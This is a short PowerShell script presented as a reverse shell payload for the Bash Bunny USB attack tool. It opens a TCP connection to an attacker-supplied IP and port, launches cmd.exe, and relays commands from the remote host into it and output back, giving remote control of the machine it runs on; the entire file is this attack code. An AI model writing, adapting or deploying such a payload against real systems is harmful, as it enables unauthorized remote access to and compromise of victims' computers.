# bunnyz.ps1
# PowerShell Reverse Shell for the Bash Bunny
# Author: Tukru
# Version: 2.0

# Set up variables
$IPAddress = $env:I
$Port = $env:P

# Create the TCP client
$TCPClient = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)
$Stream = $TCPClient.GetStream()
$Reader = New-Object System.IO.StreamReader($Stream)
$Writer = New-Object System.IO.StreamWriter($Stream)

# Set up shell process
$ShellProcess = New-Object System.Diagnostics.Process
$ShellProcess.StartInfo.FileName = "cmd.exe"
$ShellProcess.StartInfo.UseShellExecute = $false
$ShellProcess.StartInfo.RedirectStandardInput = $true
$ShellProcess.StartInfo.RedirectStandardOutput = $true
$ShellProcess.StartInfo.RedirectStandardError = $true
$ShellProcess.Start()

# Redirect input and output
$ShellProcess.StandardInput.WriteLine("whoami")
$ShellProcess.StandardOutput.ReadLine()

$Writer.AutoFlush = $true

# Set up reverse shell loop
while ($true) {
    $Data = $Reader.ReadLine()
    if ($Data -eq "exit") {
        break
    }
    $ShellProcess.StandardInput.WriteLine($Data)
    $Output = $ShellProcess.StandardOutput.ReadToEnd()
    $Writer.WriteLine($Output)
}

# Cleanup
$ShellProcess.Dispose()
$Reader.Dispose()
$Writer.Dispose()
$TCPClient.Dispose()
